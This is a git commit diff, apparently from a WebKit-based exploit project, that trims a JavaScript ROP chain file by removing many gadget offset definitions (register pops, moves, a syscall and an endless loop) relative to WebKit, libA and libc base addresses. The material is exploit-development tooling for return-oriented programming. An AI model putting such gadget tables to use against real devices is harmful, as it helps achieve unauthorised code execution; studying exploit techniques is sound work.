f3c373a1afbe77c5ae9d77ccc02d389a90901fd1
m0rph3us1987 <eoliverio1987@googlemail.com>
2017-05-08 20:26:26 +0200

    Removed some unused stuff...

--- inc/ROPChain.js
+++ inc/ROPChain.js
@@ -19,29 +19,8 @@ function ROPChain() {
 	this.Gadgets['pop rax'] = mWebkit + 0x777D3;
 	this.Gadgets['pop rbx'] = mWebkit + 0xB8936;
 	this.Gadgets['pop rcx'] = mWebkit + 0x5398F;
-	this.Gadgets['pop rdx'] = mWebkit + 0x979F2;
-	this.Gadgets['pop rdi'] = mWebkit + 0x92771;
-	this.Gadgets['pop rsi'] = mWebkit + 0x52BBB;
-	this.Gadgets['pop rsp'] = mWebkit + 0x4DE9A;
-	this.Gadgets['pop rbp'] = mWebkit + 0x40C9;
-	this.Gadgets['pop r8'] = mWebkit + 0x6732FD;
 	
-	this.Gadgets['xchg rax,rsi'] = mWebkit + 0xF3EEB0;
-	this.Gadgets['mov rdx,rsi'] = mWebkit + 0x317E7F;
-	
-	this.Gadgets['mov [rdx],rax'] = mWebkit + 0x7533F1;
-	this.Gadgets['mov rax,[rax]'] = mWebkit + 0xEA690;
-	this.Gadgets['mov rdi,rax'] = mWebkit + 0x18D18;
-	
-	
-	this.Gadgets['mov r9,rcx'] = mLibA + 0x15C62B;		// mov r8, rcx ; mov [rdi+0x18], r8; pop rbp; ret
-	
-	this.Gadgets['sub r10,r8'] = mLibA + 0x12EB0F;		// sub r10,r8; mov rax,r10; pop rpb; ret
-	this.Gadgets['add r10,rdx'] = mWebkit + 0xBB7D35;		// add r10,rdx; mov rax,r10; ret
-	
-	this.Gadgets['syscall'] = mLibc + 0x000004ba;
-	this.Gadgets['endless_loop'] = 0x0000000000471801;
-	
+	this.Gadgets['syscall'] = mLibc + 0x000004ba;	
 	this.Gadgets['nop'] = mLibc + 0x000000000000312e;
 	
 	// This function appends the desired gadget to the chain
